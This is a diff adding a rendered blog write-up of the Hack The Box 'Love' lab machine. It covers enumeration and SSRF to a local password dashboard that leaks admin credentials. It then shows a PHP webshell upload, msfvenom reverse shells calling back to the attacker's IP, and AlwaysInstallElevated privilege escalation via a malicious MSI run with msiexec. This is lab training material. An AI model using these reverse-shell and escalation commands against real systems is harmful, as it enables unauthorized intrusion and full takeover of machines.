@@ -1,0 +1,80 @@
+I"#<h2 id="enumeration">Enumeration</h2>
+
+<p>We scan with nmap and find these ports:</p>
+<ul>
+  <li>80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</li>
+  <li>135/tcp  open  msrpc        Microsoft Windows RPC</li>
+  <li>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</li>
+  <li>443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</li>
+  <li>445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</li>
+  <li>3306/tcp open  mysql?</li>
+  <li>5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</li>
+</ul>
+
+<p>We see that the webpage has a login, and it doesn’t seem vulnerable to SQLi, let’s enumerate directories with gobuster.
+<code class="language-plaintext highlighter-rouge">gobuster dir -u http://10.10.10.239/ -w /usr/share/wordlists/dirb/common.txt -r</code>
+We see several paths</p>
+
+<p><img src="/assets/Pasted%20image%2020210709165815.png" alt="Pasted image 20210709165815.png" /></p>
+
+<p>port 443 with SSL gives us forbidden, we notice there is host named <code class="language-plaintext highlighter-rouge">staging.love.htb</code> in the certificate, let’s add this host to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<p>We see it’s scanning service, when we try to give it a file from our machine it outputs the content, let’s see if we can get something from localhost that are forbidden for us, like port 5000.</p>
+
+<p>It’s a password dashboard. we have admin creds.
+<code class="language-plaintext highlighter-rouge">admin: @LoveIsInTheAir!!!!</code>
+Connect in the /admin page.</p>
+
+<p>We have access to admin dashboard.
+We go to the voters page and see there is 1 voter.
+<img src="/assets/Pasted%20image%2020210709174255.png" alt="Pasted image 20210709174255.png" />
+We take the ID and edit the password to <code class="language-plaintext highlighter-rouge">password</code></p>
+
+<p>We see that we can upload a user photo to our admin, let’s upload a php webshell, and query it from the /images folder of the website, make sure to change the shell to <code class="language-plaintext highlighter-rouge">cmd</code>.</p>
+
+<p>Since it didn’t work for me, i uploaded a reverse shell exe and used the shell variable of the php webshell to execute the reverse shell compiled with msfvenom.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">&lt;?php</span>
+ <span class="nb">system</span><span class="p">(</span><span class="s1">'rev.exe'</span><span class="p">);</span>
+ <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.152 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="o">&gt;</span> rev.exe
+</code></pre></div></div>
+
+<p>We get a shell:</p>
+
+<p><img src="/assets/Pasted%20image%2020210709180908.png" alt="Pasted image 20210709180908.png" />
+ We get the user flag in desktop of user<code class="language-plaintext highlighter-rouge">phoebe</code>
+ # Priv Esc
+ Let’s get Administrator user.</p>
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\SOFTWARE\Policies\Microsoft\Windows\Installer <span class="na">/v </span><span class="kd">AlwaysInstallElevated</span>
+<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\SOFTWARE\Policies\Microsoft\Windows\Installer <span class="na">/v </span><span class="kd">AlwaysInstallElevated</span>
+</code></pre></div></div>
+
+<p><img src="/assets/Pasted%20image%2020210709181428.png" alt="Pasted image 20210709181428.png" />
+So we can exploit <a href="https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated">Always Install Elevated exploit</a></p>
+
+<p>According to the article, here is the steps we need to follow</p>
+<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh"># Generate payload to add user to admin group</span>
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi
+
+OR
+
+<span class="gh"># Create a reverse shell</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi
+
+<span class="gh"># Run it on the target machine:</span>
+msiexec /quiet /qn /i setup.msi 
+msiexec /quiet /qn /i reverse.msi        &lt;--- Needs a netcat listener
+</code></pre></div></div>
+<p>So we generate an msi file. An msi file is a installer in windows, so we can install an exe that will execute a reverse shell with admin permissions</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.152 <span class="nv">LPORT</span><span class="o">=</span>1234 <span class="nt">-f</span> msi <span class="nt">-o</span> reverse.msi
+</code></pre></div></div>
+<p>We upload it using curl and a Python server on our machine
+<img src="/assets/Pasted%20image%2020210709182227.png" alt="Pasted image 20210709182227.png" />
+We install the <code class="language-plaintext highlighter-rouge">reverse.msi</code> with</p>
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">msiexec</span> <span class="na">/quiet /qn /i </span><span class="kd">reverse</span>.msi
+</code></pre></div></div>
+<p>And we get our admin shell
+<img src="/assets/Pasted%20image%2020210709183353.png" alt="Pasted image 20210709183353.png" /></p>
+:ET
